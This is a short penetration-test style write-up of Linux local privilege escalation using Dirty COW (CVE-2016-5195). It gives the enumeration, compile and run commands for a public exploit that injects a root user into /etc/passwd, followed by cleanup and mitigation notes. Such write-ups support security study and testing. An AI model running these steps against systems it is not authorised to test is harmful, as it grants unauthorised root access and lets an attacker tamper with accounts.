
## Privilege Escalation – Linux Kernel Exploit (Dirty COW)

##  Enumeration

The kernel version was enumerated to identify potential kernel vulnerabilities:

```bash
uname -a
```
Output:
```bash
Linux kernel 2.6.32
```
## Analysis
* The kernel version is outdated
* The system is vulnerable to Dirty COW (CVE-2016-5195)

## Vulnerability Details
* CVE: CVE-2016-5195 (Dirty COW)
* Type: Race condition in Copy-On-Write (COW) memory mapping
* Impact: Allows modification of read-only files

Result: Local privilege escalation to root

##  Exploitation Preparation

A publicly available proof-of-concept (PoC) exploit for **Dirty COW (CVE-2016-5195)** was obtained from a trusted security repository:

 **Exploit Reference:**  
[Dirty COW PoC – GitHub](https://github.com/firefart/dirtycow)

The exploit source code was then compiled locally:

```bash

gcc -pthread dirty.c -o dirty -lcrypt
```
## Exploitation
The exploit was executed with a new password argument:
```bash
./dirty <new-password>
```
##  Exploit Behavior
* Creates a backup of /etc/passwd at /tmp/passwd.bak
* Exploits the kernel race condition
* Injects a UID=0 (root) user into /etc/passwd
* Enables root access without prior privileges

 Result
Switching to the injected user confirms privilege escalation:
```bash
su <username>
whoami
```
Output:
```bash
root
```
 Privilege escalation successful

 Cleanup
After testing, the system was restored to its original state:
```bash
mv /tmp/passwd.bak /etc/passwd
```
## Mitigation
1.) Update the kernel to a patched version:
```bash
apt upgrade linux-image
```
2.) Identify kernel vulnerabilities:
```bash
searchsploit linux kernel $(uname -r)
```
3.) Enable kernel module signing

Use hardened kernels such as grsecurity / PaX
